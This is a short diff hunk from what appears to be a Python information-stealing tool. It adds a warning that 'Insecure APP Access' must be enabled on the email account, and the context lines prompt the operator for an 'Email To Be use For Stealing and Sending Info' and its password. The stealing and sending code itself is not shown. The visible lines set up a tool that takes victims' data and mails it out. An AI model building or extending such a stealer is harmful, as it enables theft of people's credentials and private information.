@@ -22,6 +22,7 @@ golo = '''
 
 print(golo)
 time.sleep(1)
+print(colored("\n\n[!]Please Note That Insecure APP Access should Be enabled on the email which you specify here", "red", attrs=['bold']))
 
 email = input("[*]Enter the Email To Be use For Stealing and Sending Info: ")
 password = getpass.getpass("\n[*]Enter the Password For Email: ")
